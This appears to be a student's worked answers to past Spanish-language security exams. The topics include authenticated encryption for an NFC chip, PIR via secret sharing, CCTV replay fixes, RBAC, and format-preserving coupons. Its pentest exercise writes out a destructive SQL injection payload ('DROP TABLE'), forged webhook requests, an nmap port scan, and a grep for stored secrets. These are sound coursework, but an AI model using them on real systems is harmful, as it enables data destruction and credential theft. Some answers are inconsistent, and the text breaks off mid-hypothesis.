Si se utilizó alguna de las claves de escritura válidas, los datos quedarán almacenados. Sino, se ignorará la operación.  
Para leer un compartimiento, el chip debe recibir utilizando una transmisión por proximidad (NFC) una trama con el siguiente formato:

`Header (4 Bytes) || Offset (2 Bytes) || Size (2 Bytes)`  
Donde:

- Header son 4 bytes con valor fijo compuesto por los valores ASCII de las letras “RCAL”
- Offset es un número entre 0 y 1023 indicando desde qué posición leer en el compartimiento
- Size es un número entre 1 y 1024 indicando cuánto leer

Toda la trama viaja cifrada utilizando **AES-GCM** con la clave de lectura correspondiente.  
Si se utilizó alguna de las claves de lectura válidas, los datos serán retornados. Sino, se ignorará la operación.  
NOTA: Ambas operaciones de lectura y escritura son tramas que viajan por el mismo canal. Parte del procesamiento del programa del chip es determinar de qué tipo de operación se trata la trama que está procesando.

_**a) Indicar paso a paso que debe hacer el programa dentro del chip para validar un pedido de escritura y ejecutarlo (1 pto.)**_

El chip recibe una trama cifrada por NFC. No sabe a priori si es lectura o escritura, ni para qué compartimento es, porque todo está cifrado.

**Paso 1 — Determinar qué clave descifra la trama:**

El chip prueba descifrar la trama con cada una de las 64 claves (32 de escritura + 32 de lectura). Para cada clave:

- Intenta descifrar con AES-GCM
- AES-GCM incluye un tag de autenticación. Si la clave es incorrecta, el tag falla → descarta esa clave y prueba la siguiente
- Si el tag valida → encontró la clave correcta

Según qué tipo de clave funcionó, el chip ya sabe:

- Si fue una clave de escritura → es una operación de escritura, y sabe en qué compartimento
- Si fue una clave de lectura → es una operación de lectura (se maneja en el punto b)

Programa dentro del chip recibe: `AES-GCM_k_escritura{Header (4 Bytes) || Size (2 Bytes) || Data (Variable)}` → una trama de escritura, cifrada con la clave de escritura con AES-GCM que proporciona seguridad CCA (autenticidad + cifrado).

**Paso 2 — Verificar el header:**

Verifica que los primeros 4 bytes del texto plano sean "MTRX". Si fue una clave de escritura pero el header dice "RCAL" (o cualquier otra cosa), descarta la trama como inválida. Esto es una verificación de consistencia: clave de escritura debe corresponder con header de escritura.

**Paso 3 — Validar el campo Size:**

Verifica que Size esté entre 0 y 1024. También verifica que Size coincida con la cantidad real de bytes en Data (que el largo de la trama sea consistente). Si no coincide, descarta.

**Paso 4 — Escribir los datos:**

Almacena los bytes de Data en el compartimento correspondiente (el que correspondía a la clave que funcionó en el paso 1).

_**b) Indicar paso a paso que debe hacer el programa dentro del chip para validar un pedido de lectura y ejecutarlo (1 pto.)**_

El paso 1 es el mismo que en escritura — el chip ya determinó que la clave que funcionó es una clave de lectura del compartimento i.

**Paso 2 — Verificar el header:**

Verifica que los primeros 4 bytes del texto plano sean "RCAL". Si el header no coincide, descarta la trama.

**Paso 3 — Validar Offset y Size:**

- Verificar que Offset esté entre 0 y 1023
- Verificar que Size esté entre 1 y 1024
- Verificar que Offset + Size ≤ 1024 (que no se lea más allá del compartimento, evitando un **buffer over-read** que podría exponer datos de otros compartimentos)

**Paso 4 — Leer y retornar los datos:**

Lee Size bytes a partir de la posición Offset del compartimento i. Cifra la respuesta con AES-GCM usando la clave de lectura del compartimento i y la envía por NFC.

_**c) Si no fuese posible utilizar el criptosistema AES-GCM, ¿qué características debe tener el criptosistema que lo reemplace para poder seguir aplicando el mismo procedimiento? (1 pto.)**_

**1. Cifrado (confidencialidad):**

Los datos viajan cifrados por NFC. Sin confidencialidad, cualquiera con un lector NFC cerca podría leer la información médica o de contacto de la persona. El reemplazo debe proveer cifrado.

**2. Autenticación (integridad + autenticación del origen):**

Esta es la propiedad más crítica para el funcionamiento del sistema. El chip usa el tag de autenticación de GCM para:

- **Determinar qué clave se usó:** prueba las 64 claves y la que valida el tag es la correcta. Sin autenticación, el chip no puede saber cuál clave descifró correctamente (descifrar con la clave incorrecta produce basura, pero el chip no puede distinguir basura de datos válidos de forma confiable solo por el header)
- **Garantizar integridad:** que nadie modificó la trama en tránsito
- **Diferenciar lectura de escritura:** según qué tipo de clave valida el tag

**En resumen, el reemplazo debe ser un esquema de cifrado autenticado (Authenticated Encryption).** Ejemplos válidos:

- AES-CCM
- Encrypt-then-MAC (AES-CBC + HMAC con claves independientes)

No alcanza con solo cifrado (AES-CBC solo) porque sin el tag de autenticación el chip no puede determinar qué clave es la correcta ni garantizar integridad. Tampoco alcanza con solo MAC (HMAC solo) porque se pierde confidencialidad.

## Ejercicio 2

Considerar el problema conocido como **Private Information Retrieval (PIR)**, donde se busca que una parte consulte información de un servidor (imaginar un registro en una base de datos), sin que este último pueda saber cual es la información consultada.  
Está demostrado que la única implementación con garantías absolutas de garantizar esa propiedad consiste en que el servidor envía en cada requerimiento la base de datos completa y que el cliente tome el registro que le interesa. Claramente esto no es muy práctico.  
Una implementación de PIR con algunas restricciones consiste en contar con **N servidores independientes**, donde cada entrada de la base de datos se cifra utilizando un **criptosistema de umbral con parámetros (k, N)**. Para guardar una entrada nueva, cada servidor almacena una **sombra** del secreto compartido.  
Para recuperar una entrada, el cliente elige **k servidores al azar** y les solicita la sombra asociada a la entrada que quiere recuperar, reconstruyendo localmente el secreto.

1. ¿Por qué desde el punto de vista de un único servidor no es posible saber qué información fue solicitada? (1 pto.)
    
    Debido al esquema de secreto compartido, cada servidor tiene una sombra de cada entrada que por si sola no tiene ningun sentido. Por lo tanto, cuando el cliente elige una sombra de la entrada de dicho servidor, el servidor no sabe que dato esta proporcionando, solo tiene una idea de que entrada se trata. Ademas es importante mencionar que los servidores son **independientes** (no se comunican entre sí), porque si k servidores se pusieran de acuerdo y compartieran qué les pidió el cliente, podrían juntar sus sombras y reconstruir el dato. La seguridad depende de que no haya colusión entre k o más servidores.
    
2. ¿Cuáles serían los valores mínimos de k y N para garantizar que el compromiso de **2 servidores no afecte la privacidad de los requerimientos** y la caída de hasta 4 servidores no afecte la disponibilidad de la información en el modelo teórico? ¿Por qué? (1 pto.)
    
    k > 2
    
    n - 4 ≥ k ⇒ n ≥ k + 4
    
    ⇒ si k = 3 → n = 7
    
3. En la práctica, un servidor comprometido podría, a partir de un requerimiento, realizar él mismo los requerimientos por la cantidad de sombras necesarias para reconstruir el secreto y vulnerar el principio de privacidad. ¿Qué mecanismos implementaría para evitar que esto suceda (ser detallado, a nivel de que información exactamente enviaría/utilizaría y como la validaría)? (1 pto.)
    
    La idea es que solo clientes legitimos puedan hacer pedidos → quiero distinguir cliente legitimo de un servidor comprometido.
    
    Podemos pedir que los clientes firmen con su firma digital los pedidos para ver si realmente son clientes legitimos → autorizacion
    
    Pero ademas de eso, necesitamos resguardar la informacion que le mandamos porque capaz el servidor puede interceptar los pedidos y ver el contenido de la informacion que otros servidores le envian al cliente. Para ello, necesitamos cifrar la informacion con una clave que solo conozca el cliente…
    
    ```jsx
    Cliente → Servidor_i: "Dame sombra de entrada 2" || pk_cliente || Sign_sk_cliente(pedido)
    
    Servidor_i:
    1. Verifica firma → confirma que es un cliente legítimo (no otro servidor)
    2. Busca la sombra pedida
    3. Cifra la respuesta con pk_cliente
    4. Servidor_i → Cliente: Enc_{pk_cliente}(sombra)
    ```
    
    Un servidor comprometido que intercepte la respuesta de otro servidor ve `Enc_{pk_cliente}(sombra)` pero no puede descifrarla porque no tiene la sk del cliente.
    
    Y no puede hacerse pasar por cliente porque no tiene una sk de cliente con la cual firmar pedidos válidos.
    

## Ejercicio 3

Alegria S.A., una fábrica de juguetes, decide construir un canal de venta en línea. Para ello contrata los servicios de **Comercialus S.A**., otra empresa que brinda como servicio una **plataforma de ecommerce** completa.  
Para poder utilizar la plataforma, Alegría debe integrar a su **catálogo** (para mantener actualizado el catálogo de productos publicados) y su sistema de **control de inventario** (para mantener actualizada la disponibilidad de productos e ir actualizándose con cada venta generada en el sitio).  
Para esas integraciones, Alegría decide crear un pequeño **programa**, que utilice el **API de Comercialus** y mantenga actualizado el catálogo. Para el inventario, este servicio expone a internet una **URL** que es llamada desde Comercialus cada vez que hay una venta o una devolución. El servicio ha sido desarrollado como una aplicación autocontenida que levanta su propio **web server** y corre en una de las **computadoras** de Alegría (Alegría es una empresa pequeña, no tiene ni equipo de IT, ni servidores, ni datacenter propio).  
Comercialus, interesado en que a Alegria le vaya bien, pero preocupado por la situación de la integración, dado que no hay personal de IT dedicado a mantenerla y monitorearla, decide realizar un pentest sobre la solución para detectar problemas.

_Siguiendo la metodología de hipótesis de falla, establecer 4 hipótesis de vulnerabilidades que tengan alta probabilidad de existir en el escenario descrito. Por cada una describir solamente la hipótesis y la prueba que realizaría para confirmar o refutar. (1 pto. cada una)_

|Componente|Pista|Implicación|
|---|---|---|
|URL expuesta a internet|"expone a internet una URL"|Cualquiera en internet puede acceder|
|Llamada desde Comercialus|Webhook de ventas/devoluciones|¿Se valida que viene de Comercialus?|
|App autocontenida con web server propio|No es un servidor profesional|Sin hardening, sin WAF, sin actualizaciones|
|Corre en una computadora de Alegría|Empresa sin IT|Computadora de escritorio expuesta a internet|
|Sin equipo de IT|Nadie monitorea ni actualiza|Vulnerabilidades sin parchear|
|Integración con API de Comercialus|Credenciales/API keys|¿Dónde se guardan?|
|Empresa pequeña, sin datacenter|Infraestructura casera|Sin firewall, sin DMZ, sin separación de redes|

**Hipótesis 1: Falta de autenticación en el webhook — Falsificación de ventas/devoluciones**

**Hipótesis:** La URL expuesta a internet es llamada por Comercialus cada vez que hay una venta o devolución. Pero esa URL es pública — cualquiera que la conozca o descubra puede llamarla. Si el servicio de Alegría no valida que el request proviene realmente de Comercialus (por ejemplo, mediante un token secreto, firma, o whitelist de IPs), un atacante puede fabricar requests de ventas o devoluciones falsas. Podría simular devoluciones masivas para vaciar el inventario, o simular ventas falsas para desincronizar el stock.

**Prueba:** Desde cualquier computadora externa, enviar un request HTTP a la URL del webhook simulando una venta:

`POST <https://alegria.com/webhook/venta> { "producto": "muñeca-123", "cantidad": 50 }`

Si el servicio lo acepta y actualiza el inventario sin verificar el origen del request, la hipótesis se confirma.

---

**Hipótesis 2: Computadora sin hardening expuesta a internet — Superficie de ataque masiva**

**Hipótesis:** El servicio corre en una computadora de escritorio de Alegría, una empresa sin equipo de IT. Esta computadora levanta un web server expuesto a internet. Es altamente probable que la computadora no tenga hardening: puertos innecesarios abiertos, servicios por defecto corriendo (SSH, RDP, SMB), sistema operativo sin actualizar, sin firewall configurado. Un atacante puede escanear la IP pública y encontrar servicios vulnerables que le permitan acceder a la computadora completa.

**Prueba:** Realizar un escaneo de puertos con nmap contra la IP pública de Alegría:

`nmap -sV -p 1-65535 [IP_ALEGRIA]`

Verificar qué puertos están abiertos además del web server. Si aparecen puertos como 22 (SSH), 3389 (RDP), 445 (SMB), o el puerto de la base de datos, la hipótesis se confirma. Intentar conectarse a esos servicios con credenciales por defecto.

---

**Hipótesis 3: Inyección en los parámetros del webhook — SQL Injection**

**Hipótesis:** Cuando Comercialus llama al webhook de Alegría con datos de una venta (id de producto, cantidad, datos del pedido), el servicio de Alegría probablemente actualiza su base de datos de inventario con esos datos. Si los parámetros no están sanitizados ni parametrizados, un atacante puede inyectar SQL a través del webhook para leer, modificar o borrar datos del inventario y catálogo.

**Prueba:** Enviar un request al webhook con SQL injection en los parámetros:

`POST <https://alegria.com/webhook/venta> { "producto": "muñeca-123'; DROP TABLE inventario; --", "cantidad": 1 }`

Como prueba menos destructiva:

`{ "producto": "' OR '1'='1", "cantidad": 1 }`

Verificar si el servicio procesa la inyección o la rechaza.

---

**Hipótesis 4: API keys de Comercialus hardcodeadas o expuestas**

**Hipótesis:** Para integrarse con la API de Comercialus, el programa de Alegría necesita credenciales (API key, token, usuario/contraseña). Como fue desarrollado como una aplicación autocontenida por una empresa sin IT, es probable que estas credenciales estén hardcodeadas en el código fuente, en un archivo de configuración en texto plano, o en variables de entorno sin protección. Si un atacante accede a la computadora (via la hipótesis 2), obtiene las credenciales de la API de Comercialus y puede manipular el catálogo, precios y pedidos directamente.

**Prueba:** Si se logra acceso a la computadora (vía puertos expuestos o alguna otra vulnerabilidad), buscar archivos de configuración:

`grep -r "api_key\|token\|password\|secret" /ruta/aplicacion/`

También examinar el código fuente de la aplicación buscando credenciales hardcodeadas. Verificar si las credenciales están en texto plano o cifradas.

# 20-07-2020

# 17-02-2020

# **Fecha IDK**

## **Ejercicio 1 (idk fecha)**

Un municipio ha comprado un sistema de circuito cerrado de cámaras de seguridad que ha distribuido por todas las calles y avenidas principales.

La información recolectada por las cámaras será utilizada en tareas de prevención y seguridad. Se le solicitó a la empresa una descripción técnica del mecanismo utilizado para proteger las señales, y esta fue la respuesta obtenida:

- Cada cámara tiene un **número de serie** único (de 000.000.001 a 999.999.999) que la identifica.
- Cuando se sincroniza una cámara con una base, se genera una **clave aleatoria de 512 bits**, que se graba en la cámara y queda en la base de datos de la base.
- Una vez encendida, la cámara codifica cada cuadro capturado y lo envía cifrando los datos utilizando **AES-256, en modo CBC**, utilizando los 256 bits menos significativos de la clave compartida con la base.
- El IV se calcula tomando la cantidad de milisegundos que ocurrieron desde las 00:00 horas del día hasta el momento de enviar el mensaje.El IV y la cámara se envían en plano, pero el cuadro se envía cifrado. O sea, se envía:  
    `[ IV | #serie | cifrado(frame) ]`
    - **IV (en plano):** la cantidad de milisegundos desde las 00:00 del día. Se usa como IV para AES-CBC.
    - **#serie (en plano):** el número de serie de la cámara (para que la base sepa qué clave usar para descifrar).
    - **cifrado(frame) (cifrado):** el cuadro de video cifrado con AES-256-CBC usando la clave compartida entre esa cámara y la base
- El servidor valida que el IV de un cuadro recibido, coincida aproximadamente con el horario actual (con un margen de $ 10 segundos), y de ser así, procede a descifrarlo. Para ello, busca la clave asociada a la cámara según el número de serie del mensaje. Como es trivial saber si el contenido es una trama de video o no, se descartan descifrados que no forman un cuadro de video válido, y si la situación se repite, se genera un caso para investigar qué pasa con la cámara.

**¿Qué hace la base al recibir?**

1. Lee el #serie → busca la clave asociada a esa cámara
2. Lee el IV → verifica que coincida con la hora actual (±10 segundos)
3. Si el IV es válido, descifra el frame con la clave y el IV
4. Verifica que lo descifrado sea un cuadro de video válido

**Envío normal**  
`CAM1 envía: (IV=1 || #serie || Enc_k(frame1)) ———> ATACANTE ———> Base recibe OK`  
**Ataque de replay**

`CAM1 envía: (IV=2 || #serie || Enc_k(frame2)) ———> ATACANTE ———> reenvía el mensaje anterior (IV=1 || #serie || Enc_k(frame1))`

**Con MAC agregado**  
`CAM1 envía: (IV=2 || #serie || Enc_k(frame2)) + MAC`

a) Un análisis preliminar indica que un atacante podría congelar una imagen durante 10 segundos, reemplazando un mensaje por sucesivas repeticiones del mismo, que estarían dentro del margen de los 10 segundos. Proponer cómo solucionar esto. (1 punto)

Para evitar el ataque de replay donde un atacante congela la imagen reenviando el mismo frame repetidamente, se propone agregar un **número de secuencia (counter)** y **proteger la integridad** del mensaje.

**Cambios al protocolo:**

1. La cámara mantiene un counter que se incrementa con cada frame enviado. El counter se incluye dentro del cifrado: `Enc_k1(frame || ctr)`.
2. Se agrega un MAC sobre todo el mensaje para garantizar integridad: `MAC_k2(IV || #serie || ctr || Enc_k1(frame || ctr))`. Para la clave del MAC se utilizan los 256 bits más significativos de la clave de 512 bits (que no se estaban usando), y los 256 menos significativos siguen usándose para AES-256-CBC. De esta forma las claves son independientes, lo cual es necesario porque cifrar y hacer MAC con la misma clave no es CCA-secure.  
    Alternativamente, se puede reemplazar AES-CBC por **AES-GCM**, que provee cifrado autenticado (confidencialidad + integridad) en un solo paso, eliminando la necesidad de un MAC separado.
3. La base guarda el último counter recibido de cada cámara. Al recibir un mensaje:
    - Verifica el MAC (o la autenticación de GCM) para asegurar que el mensaje no fue alterado
    - Verifica que el counter sea estrictamente mayor al último guardado para esa cámara
    - Si el counter es igual o menor, rechaza el mensaje

**¿Por qué esto soluciona el ataque?** Si el atacante reenvía un mensaje viejo, el counter será igual o menor al último registrado por la base, y será rechazado. Y el atacante no puede modificar el counter porque el MAC (o la autenticación de GCM) detectaría la alteración.

b) Determinar si existe algún problema que afecte la confidencialidad del contenido de los videos, que pueda ser encontrado basado en los puntos arriba mencionados. (0.5 puntos)

Sí, existe un problema de confidencialidad. El IV en AES-CBC necesita ser **aleatorio e impredecible** para garantizar seguridad CPA. Sin embargo, el IV se calcula como la cantidad de milisegundos desde las 00:00 del día, lo cual presenta dos problemas:

1. **El IV es predecible:** un atacante que conozca la hora puede calcular exactamente qué IV se está usando en cada momento. Esto rompe la propiedad de CPA-security de AES-CBC.
2. **El IV se repite:** cada día a la misma hora se genera el mismo IV. Peor aún, si dos frames se envían en el mismo milisegundo, comparten exactamente el mismo IV. Con la misma clave (que nunca cambia según el enunciado) y el mismo IV, dos frames iguales producen el mismo ciphertext, lo cual filtra información sobre el contenido — similar al problema de ECB con bloques iguales.

En resumen, el IV no cumple los requisitos de AES-CBC y se compromete la confidencialidad del video.

d) Proponer medidas adicionales a incluir en el producto, que solucionen los problemas encontrados (sin introducir más información compartida entre la base y las cámaras) (1 punto)

Reemplazar AES-256-CBC por **AES-256-GCM** usando:

- Los 256 bits menos significativos de la clave como clave de cifrado (igual que antes)
- `(#serie || counter)` como nonce
- El counter incrementado por la cámara en cada frame

Esto resuelve de un solo golpe:

- **Replay:** la base rechaza mensajes con counter igual o menor al último recibido
- **IV predecible:** el nonce es único y no depende de la hora
- **Integridad:** AES-GCM incluye autenticación, el atacante no puede modificar ni el frame ni el counter
- **No se agrega información compartida nueva:** se usa la misma clave de 512 bits

## Ejercicio 2

Siguiendo con el mismo sistema del ejercicio anterior, el esquema normal de uso es que haya un grupo de operadores, cada uno siguiendo de 3 a 8 cámaras, y que ante algún evento importante, generen un caso.

Un caso es una referencia a una cámara y un momento dado, con un comentario sobre el motivo del mismo. Cada caso es revisado por un supervisor, que es quien determina qué acción realizar (llamar a policía, ambulancia, bomberos, no hacer nada, etc).

a)  Establecer un mecanismo de control de acceso razonable considerando sujetos a las cámaras, operadores y supervisores, y como objetos a los videos y los casos. Justificar el modelo de control de acceso seleccionado.

Usar **RBAC** como modelo principal y complementar con **principios de Biba** donde aplique.

|Rol|Videos|Casos|
|---|---|---|
|Cámaras|WRITE|—|
|Operadores|READ|WRITE|
|Supervisores|READ|READ|

**Justificación:**

- **RBAC** es el modelo adecuado porque los permisos se asignan naturalmente por rol (cámara, operador, supervisor), cada uno con funciones bien definidas.
- Se respeta el **principio de menor privilegio**: cada rol tiene solo los permisos necesarios para su función. Las cámaras no pueden leer videos ni casos, los operadores no pueden modificar casos ya creados, los supervisores no pueden crear casos.
- Se aplica **separación de tareas** (Clark-Wilson C3): quien observa y crea el caso (operador) no es quien decide la acción (supervisor), evitando que una sola persona controle todo el flujo.

b)  ¿Qué mecanismos compensatorios podrían agregarse al sistema para evitar o minimizar el impacto de que un operador ignore a propósito una señal de video?

**Mecanismos compensatorios:**

1. **Redundancia de operadores:** Asignar cada cámara a al menos 2 operadores distintos, de forma que si uno ignora un evento, el otro pueda detectarlo y crear el caso. Esto se alinea con el principio de **separación de privilegios** de Saltzer y Schroeder: no depender de una sola persona para una función crítica.
2. **Logs y auditoría:** Registrar toda la actividad de los operadores: qué cámaras vieron, cuándo, y qué casos crearon o no crearon. Esto permite detectar a posteriori si un operador ignoró eventos sistemáticamente. Se alinea con **Clark-Wilson C4** (registrar todas las operaciones).
3. **Detección automática de eventos:** Implementar alertas automáticas (detección de movimiento, análisis de video) que notifiquen cuando ocurre algo inusual. Si el sistema detecta un evento y el operador no crea un caso dentro de un tiempo razonable, se genera una alerta al supervisor. Esto reduce la dependencia del factor humano.
4. **Rotación de operadores:** Rotar periódicamente la asignación de cámaras entre operadores, de forma que ningún operador tenga siempre las mismas cámaras. Esto evita que un operador pueda ignorar eventos de forma sistemática en una zona específica (por ejemplo, por complicidad con alguien en esa zona).

# 20-07-2018

## Ejercicio 1

El sistema de seguridad del museo Oddisey está completamente automatizado. Cada cuadro o pieza de tamaño grande tiene adosada una etiqueta de $1\text{mm}^2$ que es un sensor de seguridad. Asimismo, cada vitrina que protege a objetos más pequeños o delicados tiene adosado al vidrio blindado otro sensor de iguales características.  
Estos sensores no detectan movimiento, pero pueden transmitir una señal y escuchar la señal transmitida por sus vecinos (en un radio de aprox. 1 metro).  
Cuando se activa el sistema, cada sensor mira qué sensores tiene cerca y los deja registrados. Luego, cada 5 segundos vuelve a repetir la medición y si encuentra alguna discrepancia, emite una señal de alerta.  
La señal de alerta, al ser detectada por cualquier sensor, es retransmitida a todos sus vecinos, que a su vez la retransmiten, y así sucesivamente hasta llegar a un panel que existe en cada habitación que está conectado a la alarma central del museo y da aviso a los guardias.  
Los sensores cuentan con un par de claves pública y privada de 320 bits (para utilizar con criptosistemas asimétricos de curvas elípticas) propias provistas de fábrica y a priori no conoce a ninguno de los otros sensores.  
La versión inicial del sistema transmitía todas las señales en plano, pero un análisis de seguridad encontró una serie de problemas. Para cada problema proponga cómo modificaría el comportamiento de los sensores al enviar y al recibir señales, de tal manera que cada modificación NO deshaga la seguridad conseguida por las modificaciones anteriores (dicho de otra manera, todos los cambios juntos deben terminar en un sistema que no tenga ninguna de las vulnerabilidades encontradas):

1. Fue posible reemplazar un elemento con su sensor por un transmisor programado para emitir las mismas señales luego de escuchar al sensor unos minutos
    
    El atacante pudo interceptar una de las señales del sensor y realizar un ataque de replay. Para evitar este problema y asegurar que únicamente el propio sensor pueda emitir la señal, hay que sumarle integridad al sistema y para incluso aún mayor seguridad agregar un timestamp o un counter. Optamos por el uso de un counter ya que es posible que dado que los sensores son simplemente chips de 1mm^2 puede que no tengan sus relojes sincronizados.  
    Para sumar integridad, podemos hacer que las señales se firmen con el clave privada. Y las señales que transmiten deben tener el id del sensor además de un timestamp, todo esto firmado digitalmente por el propio sensor. Una vez que esta señal llega al panel central, verifica la señal con la PK y se fija que current_time y el timestamp no tengan una discrepancia mayor a 5 segundos.
    
    Sensor → broadcast a todos los vecinos en 1m:  
    id_sensor || CTR || Sign_sk(id_sensor || CTR)
    
    Cada vecino:
    
    1. Verifica la firma con la pk del sensor emisor
    2. Verifica que CTR > último CTR recibido de ese sensor
    3. Si es válido, acepta la señal
2. Fue posible desactivar el sistema transmitiendo una señal de apagado
    
    Lo mismo que arriba, pues solo el sensor legítimo puede firma digitalmente con su clave privada la señal de apagado.
    
3. Fue posible disparar la alarma utilizando un transmisor que emita la señal que los sensores interpretaban como alarma
    

Cuando se activa el sistema, cada sensor hace broadcast de su pk a sus vecinos:  
`Sensor → vecinos: id_sensor || pk_sensor`  
Cada sensor almacena la tabla `id → pk` de sus vecinos. A partir de ahí, todas las señales van firmadas.  
(Misma limitación que el ejercicio del MALBA: sin PKI no se puede validar la integridad de las pk durante el setup. La mitigación es que el setup ocurra en un momento controlado — cuando se instala el sistema — y no se acepten nuevas pk después.)

Cada sensor firma sus señales con su sk e incluye un counter:

`Señal normal: id_sensor || CTR || Sign_sk(id_sensor || CTR)`

Cada vecino al recibir:

1. Verifica la firma con la pk del sensor emisor → si falla, descarta
2. Verifica que CTR sea estrictamente mayor al último CTR recibido de ese sensor → si no, descarta

Funciona porque:

- El atacante no puede generar firmas válidas porque no tiene la sk del sensor (se fue con el sensor/fue destruido)
- El atacante no puede hacer replay porque el CTR de las señales capturadas ya fue registrado por los vecinos como usado
- Si intenta modificar el CTR para incrementarlo, la firma se invalida

**Punto 2: Desactivar el sistema transmitiendo señal de apagado**

**El ataque:** El atacante transmite una señal de apagado y los sensores la obedecen, desactivando el sistema.

**La solución:** Con las firmas del punto 1, los sensores solo aceptan señales firmadas por sensores vecinos conocidos (cuya pk tienen registrada del setup). Una señal de apagado sin firma válida de un sensor registrado es descartada.

Pero además, la señal de apagado debería ser un comando especial que **solo el panel central puede emitir** (firmado con la sk del panel). Los sensores conocen la pk del panel desde el setup. Si un sensor recibe una señal de apagado:

1. Verifica que esté firmada por el panel → si no, la descarta
2. Verifica que el CTR sea mayor al último del panel → si no, la descarta (anti-replay)

`Señal de apagado: id_panel || "APAGAR" || CTR || Sign_sk_panel(id_panel || "APAGAR" || CTR)`

**¿Por qué funciona?**

- Un atacante externo no puede falsificar la firma del panel
- Un replay de una señal de apagado anterior falla por el CTR
- Ningún sensor individual puede apagar el sistema (solo el panel tiene ese privilegio)

**Punto 3: Disparar alarma falsa transmitiendo señal de alerta**

**El ataque:** El atacante transmite una señal de alerta. Los sensores la detectan, la retransmiten a sus vecinos, estos a los suyos, y así hasta llegar al panel, disparando una alarma falsa. Esto podría usarse para generar falsas alarmas repetidamente hasta que los guardias las ignoren (boy who cried wolf), y luego robar de verdad.

`id_sensor || "ALERTA" || CTR || Sign_sk(id_sensor || "ALERTA" || CTR)`

Su vecino directo verifica la firma (tiene su pk), confirma que es legítima, y emite su propia alerta:

`id_vecino || "ALERTA" || CTR_vecino || Sign_sk_vecino(id_vecino || "ALERTA" || CTR_vecino)`

Cada sensor genera su propia alerta firmada por sí mismo cuando recibe una alerta válida de un vecino. No retransmite la alerta original, genera una nueva propia. Así cada sensor en la cadena solo necesita verificar la firma de su vecino inmediato.

Y un atacante externo no puede inyectar una alerta falsa en ningún punto de la cadena porque no tiene la sk de ningún sensor legítimo. Si intenta emitir una alerta, el sensor más cercano no puede verificar la firma (no tiene la pk del atacante en su tabla de vecinos) y la descarta.

## Ejercicio 2

Existe un tipo de criptosistema denominado Format Preserving Encryption (FPE).  
La idea de este tipo de criptosistemas es que: `P=C={0,1,...,N}` para un N arbitrario. Esto permite, que el texto plano y cifrado sean del mismo tipo, propiedad muy útil para cifrar datos sin modificar la forma en la que se almacenan o transmiten.  
Por ejemplo, se podría cifrar un número de tarjeta de crédito, de tal forma que el resultado sea otro número de tarjeta, o un número de _x_ dígitos, de tal forma que el resultado sea otro número de esa misma cantidad de dígitos.  
Además de criptosistemas específicos de este tipo, hay formas de convertir un criptosistema de bloque en un FPE. Una de ellas funciona de la siguiente manera:

Sea $E_k(x)$ una primitiva de cifrado en bloque de tamaño _n_. Se define $FPE_k(x)$, primitiva de cifrado con $P=C=\{0,1,...,m-1\} / m<2^n$ a través del siguiente pseudocódigo:

```jsx
fpe = x
do {
	x = fpe 
	fpe = E_k(x)
} while (fpe >= m)
```

Un uso interesante de estas funciones es la creación de códigos para cupones.  
Por ejemplo, si consideramos los cupones como números de 20 dígitos, podemos generar 10.000 cupones cifrando los número del 0 al 9.999.

Siguiendo los parámetros del ejemplo, contestar:

1. Cuál es la probabilidad de que un atacante genere un cupón válido?
    
    Para generar un cupón válido, el atacante tiene dos caminos:  
    **Camino 1 — Romper la clave:** Si obtiene k, puede ejecutar FPE_k y generar todos los cupones que quiera. Como E_k(x) es pseudoaleatoria, el atacante no puede determinar ningún patrón en los cupones generados, así que su única opción es fuerza bruta sobre la clave. Si la clave es de n bits, la probabilidad de encontrarla es 1/2^n.  
    **Camino 2 — Adivinar un cupón al azar:** El espacio de cupones de 20 dígitos es 10^20. Se generaron 10.000 cupones válidos. La probabilidad de acertar es:  
    `10.000 / 10^20 = 10^4 / 10^20 = 1/10^16`
    
2. Cambia en algo la seguridad si se deciden cifrar los números del 10.000 al 19.999 en lugar de los originales? Justificar
    
    No, porque la seguridad no depende de los números a cifrar sino de la clave. FPE es una biyección sobre el espacio de 10^20 valores. Cifrar 0-9.999 o 10.000-19.999 produce la misma cantidad de cupones válidos (10.000) distribuidos en el mismo espacio. La probabilidad de adivinar sigue siendo 1/10^16.
    
3. Varía el esfuerzo de un atacante para generar un cupón válido si construimos el FPE con una primitiva de cifrado con claves de 64 bits, 128 o 256 bits? Justificar
    
    Depende del ataque:
    
    **Si intenta romper la clave:** Sí varía. Mientras más larga la clave, mayor el esfuerzo para encontrarla por fuerza bruta (2^64 vs 2^128 vs 2^256).
    
    **Si adivina cupones al azar:** No varía. La probabilidad de acertar un cupón es 1/10^16 independientemente del tamaño de la clave, porque el atacante no interactúa con la clave en este ataque.
    
4. Dado un cupón de 20 dígitos, cómo se puede verificar si el cupón es válido?
    
    Hacer la inversa de FPE (descifrar) y verificar que el resultado esté en el rango de números que se usaron para generar los cupones (entre 0 y 9.999):
    
    ```jsx
    msg = c
    do {
        c = msg
        msg = Dec_k(c)
    } while (msg >= m)
    
    Si msg está entre 0 y 9999 → cupón VÁLIDO
    Si no → cupón INVÁLIDO
    ```
    
    No hace falta guardar una lista de cupones ni buscar en una base de datos. Solo descifrar y verificar el rango.
    

**Nota**: $10^{20}$ es aproximadamente $2^{66,4}$

## Ejercicio 3

Honoris es un sistema online que estima la reputación de un jugador a través de integraciones con más de 100 juegos en línea.  
Cada juego define hitos con los cuales otorga puntuación. Los **administradores** de cada juego determinan qué hitos otorgan puntuación. Los **administradores de honores** determinan para cada juego un **coeficiente** que se multiplica al valor del hito a la hora de sumar reputación (con esto balancean juegos que tienen hitos que se consiguen en días, de aquellos en los cuales se tardan meses años). Los desarrolladores utilizan una **API REST expuesta por el sistema** para notificar la concreción de hitos por parte de los jugadores. Dicha API usa **TLS v1.0** y requiere que los **headers lleven un API Secret** (64 caracteres aleatorios otorgados a cada empresa al registrarse).  
A fines de mantener simple la plataforma, todavía no se consideró la posibilidad de que la puntuación de los hitos varíe o que se agreguen nuevos hitos para juegos existentes.  
Honoris fue un éxito y consiguió llegar a un millón de suscripciones en dos meses, pero los administradores comenzaron a notar la aparición de muchísimas cuentas que tenían una reputación imposible de alcanzar siquiera en un año de jugar todos los días 8 horas.  
Luego de descartar un bug en el sistema, la empresa decide contratar una prueba de seguridad.

1. Con la información conocida, establecer 4 hipótesis plausibles, ordenadas de la más probable a la menos probable, que hay que revisar para encontrar el/los problemas. Explicar por qué considera que cada hipótesis es altamente probable y qué esperaría encontrar
    
2. Explicar cómo probaría las hipótesis siguiendo la metodología de un pen-test.
    
3. **Hipótesis 1 (más probable): TLS v1.0 roto → Robo de API Secret → Notificación de hitos falsos (Sensitive Data Exposure)**  
